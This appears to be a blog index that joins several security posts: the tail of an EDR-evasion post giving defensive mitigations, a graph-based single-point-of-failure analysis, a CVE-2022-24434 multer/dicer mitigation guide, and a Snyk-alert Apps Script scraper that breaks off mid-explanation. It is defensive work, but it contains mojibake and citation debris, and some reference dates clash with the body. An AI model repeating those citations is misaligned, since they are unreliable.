‚ÄúBring Your Own Installer‚Äù technique was publicly unveiled in early 2025 when Babuk ransomware actors bypassed SentinelOne EDR by abusing its installerhalcyon.ai. Aon/Stroz Friedberg‚Äôs report (Jan 2025) and subsequent coverage (May 2025) detailed how the attackers exploited the upgrade process to drop the agent, then encrypted the systembleepingcomputer.comhalcyon.ai. SentinelOne‚Äôs response and the industry discussion around BYOI in 2025 represent the latest evolution of endpoint evasion tactics. Mitigation Approaches and Defensive Measures Finally, we compare the mitigation strategies relevant to each evasion category. These approaches combine vendor-side fixes, configuration hardening, and detection techniques that defenders should employ:\nEvasion Technique Mitigation Strategies Installer Abuse (BYOI) Harden EDR Upgrade/Uninstall: Use solutions that offer centralized authorization for agent uninstall or upgrade (e.g., SentinelOne‚Äôs ‚ÄúOnline Authorization‚Äù toggle)halcyon.aibleepingcomputer.com. Ensure this is enabled so that local reinstall attempts cannot proceed without approval. Maintain Anti-Tamper Controls: Make sure the EDR‚Äôs self-protection/tamper prevention is fully enabled and updated ‚Äì vendors should patch flaws in upgrade processes quickly. Administrators can also monitor for unexpected installer executions or multiple version installer files on endpointsfile-uzvb8akgpxzutg7wga8ks6 (as seen in the Babuk case). Vulnerable Drivers (BYOVD) Driver Blocklisting: Enable Microsoft‚Äôs built-in Vulnerable Driver Blocklist (available via Windows Defender Application Control or Core Isolation settings) to prevent known bad drivers from loadingresearch.checkpoint.comresearch.checkpoint.com. Keep this list updated (Microsoft updates it periodically for new threats). EDR Kernel-mode Monitoring: Use EDR solutions that can detect or block malicious driver behavior. For example, EDRs like ESET flag the loading of drivers from unusual locations or known vulnerable driversfile-4pcvlwhk3myukez4vihgen. This can stop attacks where new, unsigned drivers are introduced. Least Privilege \u0026amp; Device Control: Limit administrative privileges on endpoints so that installing drivers is more difficult for attackers. Consider using Group Policy or device control software to prevent unapproved driver installation altogether. Rapid Patching of OS and Drivers: Ensure that legitimate drivers on systems are updated to patched versions. Many BYOVD attacks target drivers (e.g., old anti-cheat or overclocking tools) that might be sitting on disk ‚Äì remove or update those to eliminate the vulnerable versions. DLL Hijacking / Side-Loading Apply Vendor Patches: Keep endpoint security software up to date. Vendors like ESET issued patches for DLL load vulns (e.g., CVE-2024-11859) ‚Äì applying these closes the door on known hijack opportunitiessecurelist.com. Secure Configuration: Wherever possible, enable options like Protected Process Light (PPL) for EDR processes (many AV/EDR run as PPL by default now, which can prevent unsigned code injection). Also consider Windows Defender‚Äôs ASR rules that block suspicious behaviors (there‚Äôs a rule to prevent Office apps or others from creating child processes, which can mitigate some side-load scenarios). Monitoring and Hunting: Watch for anomalous DLL loads. For instance, if a legitimate process loads a DLL from a Temp directory or a user profile path, that‚Äôs a red flag. Use EDR telemetry to detect if known LolBins (e.g., rundll32.exe, regsvr32.exe, or even MpCmdRun.exe) are loading unusual modulessentinelone.comsentinelone.com. Creating alert rules for these conditions can catch side-loading attempts early. Service Abuse \u0026amp; Tampering Enable Tamper Protection: This is critical. For example, ensure Microsoft Defender‚Äôs Tamper Protection is on (to block registry/service changes) and similar features in other EDRs. This stops easy service shutdown or settings tweaks by malware. Secure Boot/Safe Mode Protections: If your EDR offers a feature to protect in Safe Mode or BIOS (few do), use it. At a minimum, set a BIOS/firmware password and enable BitLocker with a TPM ‚Äì this can prevent attackers from booting into alternate modes or using bootloaders without credentials. (While not foolproof if attacker already admin with device in on-state, it adds hurdles for cold reboots into other modes.) Account and Privilege Controls: Use least-privilege for service accounts. Domain admins or IT admins should use separate accounts for day-to-day work ‚Äì this helps prevent attackers from easily using high-privilege accounts to disable security. Anomaly Detection: Configure alerts for when security services stop or unexpectedly enter a disabled state. EDR management consoles often show agent status ‚Äì integrate those with SIEM to alert if an agent goes offline or is uninstalled from a host outside of maintenance windows. Also monitor for system reboots into Safe Mode (event logs can reveal if the OS started in Safe Mode). Sniffing out these events gives responders a chance to react before ransomware deployment is completenews.sophos.com. Incident Response Planning: Develop an IR plan for ‚ÄúEDR disablement‚Äù scenarios. For instance, if an endpoint stops checking in, have a playbook to isolate that host at the network level. Assume that a lost agent could mean an active attack ‚Äì a quick containment can limit damage even if one node was temporarily blinded. Defensive Recommendations for EDR Evasion In light of these threats, security teams should adopt a multi-layered defense strategy. Below are strategic recommendations to bolster endpoint defenses against these evasion techniques:\nEnable and Enforce Anti-Tamper Features: Turn on tamper-protection in all endpoint security tools (e.g. require admin console authorization or a password for any agent uninstall, stop, or upgrade)bleepingcomputer.com. Verify that features like Microsoft Defender‚Äôs Tamper Protection are enabled enterprise-wide. These measures ensure malware can‚Äôt simply shut off protections via standard OS interfaces.\nAdopt Driver Load Controls: Implement Microsoft‚Äôs Driver Blocklist (and enable Hypervisor-Protected Code Integrity if possible) to block known vulnerable drivers from executingresearch.checkpoint.comasec.ahnlab.com. Consider using EDR solutions or OS controls that block kernel drivers which are not explicitly allowed. Regularly update these controls as new BYOVD threats emerge.\nHarden Endpoint Agent Configurations: Use the most secure settings your EDR offers. For example, enable ‚ÄúOnline/Cloud authorization‚Äù for agent updates (as in SentinelOne)halcyon.ai, disable any local admin override capabilities, and ensure agents run with highest protection modes (many have a hardened mode for critical systems). Remove or password-protect any safe boot or recovery options that could be misused.\nStay Current with Patches (EDR \u0026amp; OS): Keep your endpoint security software up-to-date with the latest versions. Vendors often release silent updates to address vulnerabilities (like the ESET DLL hijack fix)securelist.com. Apply these quickly. Equally, update OS components ‚Äì for instance, apply Windows updates that improve driver blocking or Safe Mode protections. Timely patching closes known holes before attackers leverage them.\nLimit Administrator Privileges: Employ least privilege principles. Users should not have local admin rights on workstations by default. Admin accounts should be tightly controlled (use Privileged Access Management). By reducing the availability of admin-level access, you diminish the attacker‚Äôs ability to perform actions like driver installation or service manipulationhalcyon.ai. Even if malware runs, it might lack the privileges to disable the EDR.\nMonitor for Evasion Indicators: Strengthen your detection engineering to catch signs of EDR evasion. Set up alerts for mass process termination events, especially if they include security processes (could indicate a driver attack)asec.ahnlab.com. Monitor for unusual child processes of security tools or utilities (e.g., Defender‚Äôs CLI spawning unknown processes)sentinelone.com. Log and alert on any driver installations on endpoints that are not part of normal updates. Also, treat any EDR agent going offline or entering ‚Äúdisabled‚Äù state as a potential incident, and investigate immediately.\nImprove Resilience and Response: Since no prevention is 100% foolproof, focus on resilience. For example, ensure you have endpoint isolation capabilities ‚Äì if an agent reports a tamper event or stops unexpectedly, the SOC can isolate that host via network controls. Invest in endpoint backup/restoration solutions so that even if one layer (EDR) is bypassed, you can recover critical systems quickly. Regularly test your IR plan against scenarios of EDR bypass; incorporate drills where the assumption is ‚Äúthe endpoint agent was neutralized ‚Äì now what?‚Äù.\nBehavioral Analytics \u0026amp; Anomaly Detection: Leverage EDR/MDR solutions that use behavioral analytics to spot the outcomes of evasion. For instance, an attacker in Safe Mode still has to reboot the machine ‚Äì an EDR with user behavior analytics might flag an odd timing reboot or use of bcdedit commands. Similarly, detect abnormal tool usage (like an admin tool launching in an unusual context). Machine learning in EDR can sometimes pick up these oddities even if the initial evasion blinds some telemetry.\nIn conclusion, endpoint security evasion techniques have grown more sophisticated from 2020 through 2025, but a combination of good product configuration, up-to-date threat intelligence, and vigilant monitoring can significantly blunt their impact. Security engineers should work closely with their EDR vendors to deploy available safeguards (e.g., driver blocklists, tamper-proof settings) and ensure that endpoints are not an easy target for these ‚Äúliving off the land‚Äù style attacks. Ultimately, awareness and preparation are key: knowing that attackers can and will try to turn your tools against you is the first step to making sure they do not succeedhalcyon.ai.\nSources: SentinelOne, Sophos, Microsoft, ESET, Kaspersky, Aon Stroz Friedberg case studies and threat researchhalcyon.aihalcyon.aisecurelist.comnews.sophos.com, as well as CISA alerts and industry reports from 2020‚Äì2025 detailing these evasion techniquesattackiq.comtechtarget.com. These references underscore the prevalence of such tactics in recent years and the importance of a robust, multi-layered defense strategy.\nReference Links ‚Äì EDR Evasion Research(2020‚Äì2025) Halcyon. (2024, January 10). Ransomware attack bypasses EDR with BYOI technique. Halcyon. https://www.halcyon.ai/blog/ransomware-attack-bypasses-edr-with-byoi-technique\nHalcyon. (2024, April 1). RansomHub‚Äôs EDR-Killer shows up in Medusa, BianLian and Play attacks. Halcyon. https://www.halcyon.ai/blog/ransomhubs-edr-killer-shows-up-in-medusa-bianlian-and-play-attacks\nSophos. (2023, April 19). ‚ÄòAuKill‚Äô EDR killer malware abuses Process Explorer driver. Sophos News. https://news.sophos.com/en-us/2023/04/19/aukill-edr-killer-malware-abuses-process-explorer-driver/\nSecurelist. (2023, March 21). APT group ToddyCat exploits a vulnerability in ESET for DLL proxying. Securelist. https://securelist.com/toddycat-apt-exploits-vulnerability-in-eset-software-for-dll-proxying/116086/\nSentinelOne. (2023, July 13). Living off Windows Defender: LockBit ransomware sideloads Cobalt Strike through Microsoft Security Tool. SentinelOne. https://www.sentinelone.com/blog/living-off-windows-defender-lockbit-ransomware-sideloads-cobalt-strike-through-microsoft-security-tool/\nSophos. (2019, December 9). Snatch ransomware reboots PCs into Safe Mode to bypass protection. Sophos News. https://news.sophos.com/en-us/2019/12/09/snatch-ransomware-reboots-pcs-into-safe-mode-to-bypass-protection/\nAttackIQ. (2023, November 1). #StopRansomware: AvosLocker Ransomware. AttackIQ. https://www.attackiq.com/2023/11/01/avoslocker-ransomware/\nBleepingComputer. (2024, January 9). New \u0026ldquo;Bring Your Own Installer\u0026rdquo; EDR bypass used in ransomware attack. https://www.bleepingcomputer.com/news/security/new-bring-your-own-installer-edr-bypass-used-in-ransomware-attack/\nCheck Point Research. (2025). Silent Killers: Unmasking a large-scale legacy driver exploitation campaign. https://research.checkpoint.com/2025/large-scale-exploitation-of-legacy-driver/\nAhnLab ASEC. (2024). Legacy driver exploitation through bypassing certificate verification. https://asec.ahnlab.com/en/86881/\nTrend Micro. (2022). AvosLocker ransomware variant abuses driver file to disable anti-virus, scans for Log4Shell. Trend Micro Research. https://www.trendmicro.com/en_us/research/22/e/avoslocker-ransomware-variant-abuses-driver-file-to-disable-anti-Virus-scans-log4shell.html\nESET. (2025). Shifting the sands of RansomHub‚Äôs EDRKillShifter. WeLiveSecurity. https://www.welivesecurity.com/en/eset-research/shifting-sands-ransomhub-edrkillshifter/\nTechTarget. (2024). BlackByte ransomware uses new EDR evasion technique. https://www.techtarget.com/searchsecurity/news/252525965/BlackByte-ransomware-uses-new-EDR-evasion-technique\n","permalink":"https://windshock.github.io/en/post/2025-05-28-endpoint-security-evasion-techniques-20202025/","summary":"This post analyzes the evolution of endpoint evasion techniques from 2020 to 2025. It covers BYOI, BYOVD, DLL hijacking, service tampering, and other sophisticated methods attackers use to bypass EDR and AV. Real-world ransomware cases and vendor impact are discussed, along with defensive insights.","title":"Endpoint Evasion Techniques (2020‚Äì2025): The Evolution of Attacks Bypassing EDR"},{"content":" Introduction: The Challenger Disaster and the Origin of the SPOF Concept In 1986, the Challenger space shuttle exploded 73 seconds after liftoff. The cause was a failed rubber O-ring in the right solid rocket booster‚Äîrendered brittle by cold weather. This seemingly minor mechanical flaw resulted in the deaths of seven astronauts and halted NASA‚Äôs shuttle program. The tragedy was a stark example of a Single Point of Failure (SPOF): when one component\u0026rsquo;s failure cascades into a systemic collapse.\nThis case has since become an iconic reference point for SPOFs across domains‚Äîengineering, business, and increasingly, cybersecurity.\nModern Cybersecurity Infrastructures and SPOF Examples In digital environments, SPOFs often lie hidden in centralized systems such as:\nAuthentication servers (e.g., Active Directory, HSS) Update deployment tools (e.g., SCCM) Gateway routers and single-region cloud architecture If these nodes are compromised or fail, the entire infrastructure can become vulnerable to complete disruption or undetected exploitation.\nModeling Infrastructure as a Graph: Attack Paths and SPOF Detection This analysis was conducted using a custom toolset available at the spofInCybersecurity GitHub repository, which defines infrastructure as a graph (graph.json) and simulates SPOF impact through path enumeration and node removal.\nThis analysis uses a graph model of real infrastructure, structured as graph.json, to simulate and measure SPOF impact.\nEach node represents an asset (PC, server, firewall, etc.), and edges represent logical or physical communication paths. We defined representative attack flows as:\nEntry ‚Üí VPN/VDI Access ‚Üí Privilege Escalation ‚Üí Malware Infection ‚Üí Data Exfiltration\nThe graph was constructed using LLMs (e.g., ChatGPT) that processed natural language documentation (network diagrams, audit reports, firewall rules) and converted it into a structured format for analysis.\nMethodology: Weighted Path Enumeration and Node Removal Simulation This analysis approximates a node‚Äôs structural centrality using real-world attack paths. Specifically:\nEnumerate all simple paths from entry to exfiltration points. Count each node‚Äôs frequency as a middle-step (excluding start/end). Apply weights (e.g., OA_PC = 0.0005, server = 1.0) to reflect operational significance. Remove each node and recalculate total reachable paths. Drop rate = SPOF impact. This yields an empirical approximation of betweenness centrality, tailored for cybersecurity threat modeling. Unlike abstract graph theory metrics, this approach grounds centrality in actual threat modeling. Each node‚Äôs importance is derived from its real role in reachable attack paths‚Äîmaking it a practical and scenario-aware approximation for SPOF detection.\nVisualization: Structural SPOFs in the Graph Figure 1 shows the infrastructure graph, color-coded by SPOF severity:\nRed = Absolute SPOF (removal cuts \u0026gt;50% of attack paths) Yellow = Relative SPOF Blue = Redundant but still impactful Gray = Low priority Visualizations also revealed structural bottlenecks‚Äîcritical systems were routed through a single gateway, creating latent SPOFs even in seemingly segmented architectures.\nKey nodes (based on 470 path samples):\nFigure 1 shows the infrastructure graph, color-coded by SPOF severity:\nRed = Absolute SPOF (removal cuts \u0026gt;50% of attack paths) Yellow = Relative SPOF Blue = Redundant but still impactful Gray = Low priority Key nodes (based on 470 path samples):\nIntranet_MGMT_Server: 61.7% of all paths Server_Access_Gateway: 55.1% Nutanix: 50.6% These nodes, while not always generating alerts, act as attack ‚Äúhubs.‚Äù\nInsights from the Graph-Based SPOF Analysis Each type of node centrality offers unique insight in cybersecurity:\nBetweenness centrality highlights nodes that act as chokepoints‚Äîideal for SPOF detection.\nCloseness centrality reveals nodes that can quickly propagate malware or response actions.\nDegree centrality may indicate common access points but not always structural criticality.\nPageRank can expose nodes trusted by other key nodes, e.g., authentication hierarchies.\nVisibility ‚â† Impact: Endpoints like OA_PC trigger many alerts, but offer little strategic value. Central infrastructure nodes, though quiet, are high-leverage targets.\nHidden SPOFs: Nutanix, though rarely flagged, appears in over half of paths.\nMisaligned Budgets: Most security spending goes to visible endpoints, not structural enablers.\nReal-World Case: SK Telecom Breach, 2025 In the 2025 breach, attackers reportedly accessed large volumes of SIM authentication data. Investigations suggest a centralized HSS server may have played a key SPOF role‚Äîyet little investment had been made in redundant design.\nThis highlights a common pattern: reactive spending after failure, rather than proactive architectural assessment.\nGraph Construction and LLM Automation Input sources included network architecture diagrams, firewall rule descriptions, and internal audit reports‚Äîoften messy, fragmented, and poorly structured. LLMs converted this documentation into structured graphs. While tools like LangChain can orchestrate workflows, even standalone GPT prompts were effective for initial modeling. Key example:\nLLMs converted documentation into structured graphs. While tools like LangChain can orchestrate workflows, even standalone GPT prompts were effective for initial modeling. Key example:\nPrompt: \u0026#34;Extract assets and their logical connections from the following network description...\u0026#34; Output: { \u0026#34;nodes\u0026#34;: [...], \u0026#34;edges\u0026#34;: [...] } Manual review ensured accuracy. This approach accelerated infrastructure graph creation and supported automated SPOF detection.\nSPOF Categorization and Response Strategy Absolute SPOFs were defined as nodes whose removal caused at least 80% of attack paths to be eliminated or which covered over 30% of total weighted path coverage. This ensured that classification was not solely based on raw frequency but accounted for weighted operational importance as well.\nNodes were classified into four tiers:\nNodes were classified into four tiers:\nSPOF Level Example Node Path Drop (%) Strategy Absolute Intranet_MGMT_Server \u0026gt;50% Redundancy, hardening Relative SCCM, AD, Nutanix 20‚Äì50% Microsegmentation, access control Redundant OA_PC, VPN_PC 10‚Äì20% Focused monitoring Low VDI terminals \u0026lt;10% Standard controls Conclusion: Prioritize Structural Risk, Not Just Alerts SPOF identification is not just a diagnostic task‚Äîit‚Äôs a strategic design imperative. Real security comes from eliminating structural bottlenecks before they become incident headlines.\nThis method also supports investment justification: organizations can estimate how much path coverage is reduced per dollar invested in reinforcing key nodes.\nSPOF identification is not just a diagnostic task‚Äîit‚Äôs a strategic design imperative. Real security comes from eliminating structural bottlenecks before they become incident headlines.\nReferences üîß Source Code and Tools spofInCybersecurity GitHub Repository üìö Attack Graphs and Centrality Survey of Attack Graph Analysis Methods ‚Äì Wiley Cybersecurity Knowledge Graphs ‚Äì ResearchGate üß† Knowledge Graphs and LLM Automation Recent Progress of Using Knowledge Graph ‚Äì ResearchGate üìå SPOF Concepts and Architectural Weaknesses Challenger O-Ring Failure üì∞ Real-World Case Studies CSIS ‚Äì Significant Cyber Incidents American Express Breach (BleepingComputer) ","permalink":"https://windshock.github.io/en/post/2025-05-15-spof-analysis-in-cybersecurity/","summary":"Analyzing the threat of Single Points of Failure (SPOF) through historical examples and graph theory, this piece presents a strategic approach to identifying and mitigating structural weaknesses in cybersecurity infrastructures.","title":"SPOF in Cybersecurity: From History to Strategy, a Graph-Based Analysis"},{"content":"üß≠ Summary Item Details Vulnerability ID CVE-2022-24434 Impact Range Indirect: dicer ‚Üí busboy ‚Üí multer Severity High (DoS - Denial of Service) Fixed Version multer@1.4.4-lts.1 Release Date May 29, 2022 Minimum Node.js Version ‚â• 6.0.0 Mitigation Summary Avoid or remove the vulnerable dicer via dependency upgrade (busboy) üß® Vulnerability Overview Attack Vector: Crafted multipart/form-data header with whitespace/tab prefix causes server crash Affected Code: HeaderParser.prototype._parseHeader() inside Dicer Report Date: May 20, 2022 (NVD Link) Express ‚Üí Multer ‚Üí Busboy ‚Üí Dicer (vulnerable layer) üîß Patch Details ‚úÖ Multer 1.4.4-lts.1 Uses busboy 1.6.0+ to avoid vulnerable dicer Adopted by NestJS (PR #9686) ‚ö†Ô∏è No Official Patch from Dicer PR exists: #22 Not merged or released ‚Üí still vulnerable üì¶ Dependency Chain Analysis Package Vulnerable? Patched? Notes Multer Indirect ‚úÖ 1.4.4-lts.1 Includes updated busboy Busboy Indirect ‚úÖ ‚â• 1.6.0 Likely avoids or removes dicer Dicer Direct ‚ùå No PR only, no release üõ† Mitigation Guide 1Ô∏è‚É£ Upgrade Node.js Minimum: v6.0.0 Recommended: v14 or higher 2Ô∏è‚É£ Upgrade Multer npm install multer@1.4.4-lts.1 Or in package.json:\n\u0026#34;dependencies\u0026#34;: { \u0026#34;multer\u0026#34;: \u0026#34;^1.4.4-lts.1\u0026#34; } 3Ô∏è‚É£ Use npm Overrides (npm ‚â• 8.3.0) \u0026#34;overrides\u0026#34;: { \u0026#34;multer\u0026#34;: \u0026#34;^1.4.4-lts.1\u0026#34; } 4Ô∏è‚É£ Apply Manual Patch (if no official fix) Patch dicer using patch-package npm install patch-package --save-dev In package.json:\n\u0026#34;scripts\u0026#34;: { \u0026#34;postinstall\u0026#34;: \u0026#34;patch-package\u0026#34; } Edit node_modules/dicer/lib/Dicer.js:\n@@ -124,7 +124,11 @@ this._bparser.on(\u0026#39;info\u0026#39;, function(isMatch, data, start, end) { - self._oninfo(isMatch, data, start, end); + try { + self._oninfo(isMatch, data, start, end); + } catch (e) { + self.emit(\u0026#39;error\u0026#39;, e); + } }); Then:\nnpx patch-package dicer ‚ö†Ô∏è This is a temporary workaround, not an official fix. You\u0026rsquo;ll need to reapply the patch if Dicer\u0026rsquo;s version changes.\nüîç Long-Term Considerations dicer is poorly maintained and lacks official updates Consider switching to alternatives like @fastify/busboy or fastify-multipart üìö References üîí CVE-2022-24434 (NVD) üì¶ Multer GitHub Releases üõ† Dicer PR #22 ‚úÖ NestJS PR #9686 üß™ Snyk Report for Multer üóÇ Stack Overflow Discussion ‚úÖ Conclusion Multer@1.4.4-lts.1 provides an indirect fix for CVE-2022-24434 On Node.js ‚â•6, upgrading Multer may be sufficient In the long run, plan for dependency removal or structural replacement ","permalink":"https://windshock.github.io/en/post/2025-05-12-cve-cve-2022-24434-dicer/","summary":"This guide analyzes a vulnerability in the Dicer module indirectly affecting Multer, and provides a practical mitigation strategy. It serves as a real-world example of dealing with unmaintained open source dependencies.","title":"Dicer Module Vulnerability Mitigation Guide: CVE-2022-24434"},{"content":"\nMotivation I initially assumed that Snyk\u0026rsquo;s alerts could be fully automated through their official API. But API alone couldn‚Äôt handle everything I needed. Many useful details‚Äîincluding \u0026ldquo;How to Fix\u0026rdquo;, \u0026ldquo;Overview\u0026rdquo; descriptions, and safe versions‚Äîwere easier to extract from the web interface.\nSince this gap couldn\u0026rsquo;t be bridged via API, I built an automated parser using Gmail and Google Apps Script. This method reads the contents of emails containing the phrase \u0026ldquo;no remediation available yet\u0026rdquo; and scrapes all relevant data from the linked vulnerability page.\nWhat It Does Searches Gmail for Snyk alerts that mention \u0026ldquo;no remediation available yet\u0026rdquo;\nFollows the redirect link to the Snyk vulnerability page\nParses:\nVulnerability name \u0026amp; link Affected package \u0026amp; version Fix suggestions (via structured FAQ JSON-LD) Overview text \u0026amp; references Latest version info (latest, non-vulnerable, publish dates) Outputs all collected data to Google Sheets\nScreenshot Examples Gmail Search Results Apps Script Running Output Google Sheet Full Code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 function extractSnykNoFixToSheet() { const sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet(); sheet.clearContents(); sheet.appendRow([ \u0026#34;Date\u0026#34;, \u0026#34;Subject\u0026#34;, \u0026#34;Project\u0026#34;, \u0026#34;Vulnerability\u0026#34;, \u0026#34;Vuln Link\u0026#34;, \u0026#34;Package\u0026#34;, \u0026#34;Version\u0026#34;, \u0026#34;Snyk Package Link\u0026#34;, \u0026#34;How to Fix\u0026#34;, \u0026#34;Overview Text\u0026#34;, \u0026#34;Overview Links\u0026#34;, \u0026#34;References\u0026#34;, \u0026#34;Latest Ver\u0026#34;, \u0026#34;Non-Vuln Ver\u0026#34;, \u0026#34;First Published\u0026#34;, \u0026#34;Latest Published\u0026#34; ]); const threads = GmailApp.search(\u0026#39;\u0026#34;no remediation available yet\u0026#34;\u0026#39;); threads.forEach(thread =\u0026gt; { thread.getMessages().forEach(msg =\u0026gt; { const date = msg.getDate(); const subject = msg.getSubject(); const body = msg.getBody(); const iconBlockMatch = body.match(/\u0026lt;img[^\u0026gt;]+icon-cli\\.webp[^\u0026gt;]*\u0026gt;[\\s\\S]*?\u0026lt;strong[^\u0026gt;]*\u0026gt;(.*?)\u0026lt;\\/strong\u0026gt;/i); const project = iconBlockMatch ? iconBlockMatch[1].trim() : \u0026#34;\u0026#34;; const vulnMatch = body.match(/\u0026lt;img[^\u0026gt;]+icon-vuln\\.webp[^\u0026gt;]*\u0026gt;[\\s\\S]{0,300}?\u0026lt;a[^\u0026gt;]+href=\u0026#34;([^\u0026#34;]+)\u0026#34;[^\u0026gt;]*\u0026gt;(.*?)\u0026lt;\\/a\u0026gt;/i); let vulnUrl = vulnMatch ? vulnMatch[1].trim() : \u0026#34;\u0026#34;; const vulnName = vulnMatch ? vulnMatch[2].trim() : \u0026#34;\u0026#34;; const packageMatch = body.match(/Vulnerability in (@?[a-zA-Z0-9_.:\\/\\-]+)\\s+([0-9][a-zA-Z0-9.\\-_]*)/); const pkgName = packageMatch ? packageMatch[1].trim() : \u0026#34;\u0026#34;; const pkgVer = packageMatch ? packageMatch[2].trim() : \u0026#34;\u0026#34;; let howToFix = \u0026#34;\u0026#34;, overviewText = \u0026#34;\u0026#34;, overviewLinks = \u0026#34;\u0026#34;, references = \u0026#34;\u0026#34;, subtitleMatch, snykPkgLink; let latestVer = \u0026#34;\u0026#34;, nonVulnVer = \u0026#34;\u0026#34;, firstPublished = \u0026#34;\u0026#34;, latestPublished = \u0026#34;\u0026#34;; try { Logger.log(`üîó Trying redirect fetch: ${vulnUrl}`); const resp = UrlFetchApp.fetch(vulnUrl, { followRedirects: false, muteHttpExceptions: true }); const status = resp.getResponseCode(); const headers = resp.getAllHeaders(); const redirected = headers[\u0026#34;Location\u0026#34;] || headers[\u0026#34;location\u0026#34;] || vulnUrl; Logger.log(`üì• Response Code: ${status}`); Logger.log(`üìé Location Header: ${redirected}`); vulnUrl = redirected; } catch (e) { Logger.log(`üî• Exception during redirect check for ${vulnUrl}: ${e}`); } try { const html = UrlFetchApp.fetch(vulnUrl).getContentText(); Logger.log(`üìÑ HTML content preview (first 1000 chars):\\n${html.slice(0, 1000)}`); subtitleMatch = html.match(/\u0026lt;span[^\u0026gt;]*subheading[^\u0026gt;]*\u0026gt;.*?\u0026lt;a[^\u0026gt;]+href=\u0026#34;([^\u0026#34;]+)\u0026#34;[^\u0026gt;]*\u0026gt;(.*?)\u0026lt;\\/a\u0026gt;/i); snykPkgLink = subtitleMatch ? \u0026#34;https://security.snyk.io\u0026#34; + subtitleMatch[1] : \u0026#34;\u0026#34;; Logger.log(`üîé subtitleMatch: ${subtitleMatch}`); Logger.log(`üîó snykPkgLink: ${snykPkgLink}`); howToFix = extractFixFromScriptJson(html); Logger.log(`‚úÖ How to Fix: ${howToFix}`); const overviewResult = extractSectionLinks(html, \u0026#34;Overview\u0026#34;); overviewText = overviewResult.text; overviewLinks = overviewResult.links.join(\u0026#34;, \u0026#34;); Logger.log(`‚úÖ Overview Text: ${overviewText}`); Logger.log(`‚úÖ Overview Links: ${overviewLinks}`); const refsResult = extractSectionLinks(html, \u0026#34;References\u0026#34;); references = refsResult.links.join(\u0026#34;, \u0026#34;); Logger.log(`‚úÖ References: ${references}`); if (snykPkgLink) { const pkgHtml = UrlFetchApp.fetch(snykPkgLink).getContentText(); const valueFromLabel = (label) =\u0026gt; { const allMatches = [...pkgHtml.matchAll(/\u0026lt;li[^\u0026gt;]*data-snyk-test=\u0026#34;DetailsBoxItem: ([^\u0026#34;]+)\u0026#34;[^\u0026gt;]*\u0026gt;[\\s\\S]*?\u0026lt;h3[^\u0026gt;]*\u0026gt;(.*?)\u0026lt;\\/h3\u0026gt;[\\s\\S]*?\u0026lt;[^\u0026gt;]+\u0026gt;(.*?)\u0026lt;\\//g)]; for (const m of allMatches) { if (m[2]?.toLowerCase().includes(label)) return m[3].replace(/\u0026lt;[^\u0026gt;]+\u0026gt;/g, \u0026#34;\u0026#34;).trim(); } return \u0026#34;\u0026#34;; }; latestVer = valueFromLabel(\u0026#34;latest version\u0026#34;); nonVulnVer = valueFromLabel(\u0026#34;latest non vulnerable version\u0026#34;); firstPublished = valueFromLabel(\u0026#34;first published\u0026#34;); latestPublished = valueFromLabel(\u0026#34;latest version published\u0026#34;); Logger.log(`üì¶ Snyk Versions - Latest: ${latestVer}, Non-Vuln: ${nonVulnVer}, First: ${firstPublished}, Latest Pub: ${latestPublished}`); } } catch (e) { Logger.log(`üî• Exception fetching redirected content for ${vulnUrl}: ${e}`); } const row = [date, subject, project, vulnName, vulnUrl, pkgName, pkgVer, snykPkgLink, howToFix, overviewText, overviewLinks, references, latestVer, nonVulnVer, firstPublished, latestPublished]; sheet.appendRow(row); }); }); } function extractFixFromScriptJson(html) { const matches = [...html.matchAll(/\u0026lt;script[^\u0026gt;]+type=\u0026#34;application\\/ld\\+json\u0026#34;[^\u0026gt;]*\u0026gt;(.*?)\u0026lt;\\/script\u0026gt;/g)]; for (const match of matches) { try { const json = JSON.parse(match[1]); const graph = json[\u0026#34;@graph\u0026#34;] || []; for (const node of graph) { if (node[\u0026#34;@type\u0026#34;] === \u0026#34;FAQPage\u0026#34; \u0026amp;\u0026amp; node.mainEntity?.length) { for (const q of node.mainEntity) { if (q.name?.toLowerCase().includes(\u0026#34;how to fix\u0026#34;) \u0026amp;\u0026amp; q.acceptedAnswer?.text) { return q.acceptedAnswer.text.replace(/\u0026lt;[^\u0026gt;]+\u0026gt;/g, \u0026#34;\u0026#34;).replace(/\\s+/g, \u0026#34; \u0026#34;).trim(); } } } } } catch (e) { Logger.log(\u0026#34;‚ùå Failed to parse How to Fix from JSON-LD block: \u0026#34; + e); } } Logger.log(\u0026#34;‚ùå No matching How to Fix found in JSON-LD blocks\u0026#34;); return \u0026#34;\u0026#34;; } function extractSectionLinks(html, sectionTitle) { const pattern = new RegExp(`\u0026lt;h2[^\u0026gt;]*\u0026gt;\\\\s*.{0,10}${sectionTitle}.{0,10}\\\\s*\u0026lt;\\\\/h2\u0026gt;[\\\\s\\\\S]{0,2000}?\u0026lt;div[^\u0026gt;]*class=\\\u0026#34;markdown-to-html[^\u0026#34;]*\\\u0026#34;[^\u0026gt;]*\u0026gt;([\\\\s\\\\S]*?)\u0026lt;\\\\/div\u0026gt;`, \u0026#34;gi\u0026#34;); const matches = [...html.matchAll(pattern)]; if (matches.length === 0) { Logger.log(`‚ùå Section \u0026#34;${sectionTitle}\u0026#34; not found.`); return { text: \u0026#34;\u0026#34;, links: [] }; } const content = matches[0][1]; Logger.log(`üîç Matched HTML block for ${sectionTitle}:\\n${content.slice(0, 500)}`); const fragment = HtmlService.createHtmlOutput(content).getContent(); const linkMatches = [...fragment.matchAll(/\u0026lt;a[^\u0026gt;]+href=\u0026#34;([^\u0026#34;]+)\u0026#34;[^\u0026gt;]*\u0026gt;/g)]; const links = linkMatches.map(m =\u0026gt; m[1]); const text = content.replace(/\u0026lt;[^\u0026gt;]+\u0026gt;/g, \u0026#34;\u0026#34;).replace(/\\s+/g, \u0026#39; \u0026#39;).trim(); return { text, links }; } How It Works 1. Gmail Parsing const threads = GmailApp.search(\u0026#39;\u0026#34;no remediation available yet\u0026#34;\u0026#39;); Searches for relevant Snyk alert emails.\n2. Extracting Vulnerability Metadata const vulnMatch = body.match(...); Grabs the vulnerability name and 